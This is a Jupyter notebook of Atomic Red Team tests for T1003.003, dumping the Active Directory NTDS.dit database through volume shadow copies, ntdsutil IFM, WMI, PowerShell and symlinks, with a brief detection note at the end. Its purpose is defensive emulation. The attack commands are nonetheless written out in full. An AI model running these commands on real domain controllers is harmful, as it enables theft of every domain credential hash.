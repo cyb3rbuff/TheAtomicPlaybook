{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# T1003.003 - OS Credential Dumping: NTDS\n",
    "Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\\NTDS\\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory)\n",
    "\n",
    "In addition to looking NTDS files on active Domain Controllers, attackers may search for backups that contain the same or similar information.(Citation: Metcalf 2015)\n",
    "\n",
    "The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n",
    "\n",
    "* Volume Shadow Copy\n",
    "* secretsdump.py\n",
    "* Using the in-built Windows tool, ntdsutil.exe\n",
    "* Invoke-NinjaCopy\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Atomic Tests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Import the Module before running the tests.\n",
    "Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Create Volume Shadow Copy with NTDS.dit\n",
    "This test is intended to be run on a domain Controller.\n",
    "\n",
    "The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
    "\n",
    "**Supported Platforms:** windows\n",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n",
    "vssadmin.exe create shadow /for=#{drive_letter}\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1003.003 -TestNumbers 1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Copy NTDS.dit from Volume Shadow Copy\n",
    "This test is intended to be run on a domain Controller.\n",
    "\n",
    "The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
    "\n",
    "This test requires steps taken in the test \"Create Volume Shadow Copy with NTDS.dit\".\n",
    "A successful test also requires the export of the SYSTEM Registry hive.\n",
    "This test must be executed on a Windows Domain Controller.\n",
    "\n",
    "**Supported Platforms:** windows\n",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n",
    "copy #{vsc_name}\\Windows\\NTDS\\NTDS.dit #{extract_path}\\ntds.dit\n",
    "copy #{vsc_name}\\Windows\\System32\\config\\SYSTEM #{extract_path}\\VSC_SYSTEM_HIVE\n",
    "reg save HKLM\\SYSTEM #{extract_path}\\SYSTEM_HIVE\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1003.003 -TestNumbers 2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Dump Active Directory Database with NTDSUtil\n",
    "This test is intended to be run on a domain Controller.\n",
    "\n",
    "The Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability\n",
    "uses the \"IFM\" or \"Install From Media\" backup functionality that allows Active Directory restoration or installation of\n",
    "subsequent domain controllers without the need of network-based replication.\n",
    "\n",
    "Upon successful completion, you will find a copy of the ntds.dit file in the C:\\Windows\\Temp directory.\n",
    "\n",
    "**Supported Platforms:** windows\n",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n",
    "mkdir #{output_folder}\n",
    "ntdsutil \"ac i ntds\" \"ifm\" \"create full #{output_folder}\" q q\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1003.003 -TestNumbers 3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Create Volume Shadow Copy with WMI\n",
    "This test is intended to be run on a domain Controller.\n",
    "\n",
    "The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
    "\n",
    "**Supported Platforms:** windows\n",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n",
    "wmic shadowcopy call create Volume=#{drive_letter}\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1003.003 -TestNumbers 4"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Create Volume Shadow Copy with Powershell\n",
    "This test is intended to be run on a domain Controller.\n",
    "\n",
    "The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
    "\n",
    "**Supported Platforms:** windows\n",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n",
    "(gwmi -list win32_shadowcopy).Create(#{drive_letter},'ClientAccessible')\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1003.003 -TestNumbers 5"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - Create Symlink to Volume Shadow Copy\n",
    "This test is intended to be run on a domain Controller.\n",
    "\n",
    "The Active Directory database NTDS.dit may be dumped by creating a symlink to Volume Shadow Copy.\n",
    "\n",
    "**Supported Platforms:** windows\n",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n",
    "vssadmin.exe create shadow /for=#{drive_letter}\n",
    "mklink /D #{symlink_path} \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1003.003 -TestNumbers 6"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Detection\n",
    "Monitor processes and command-line arguments for program execution that may be indicative of credential dumping, especially attempts to access or copy the NTDS.dit."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}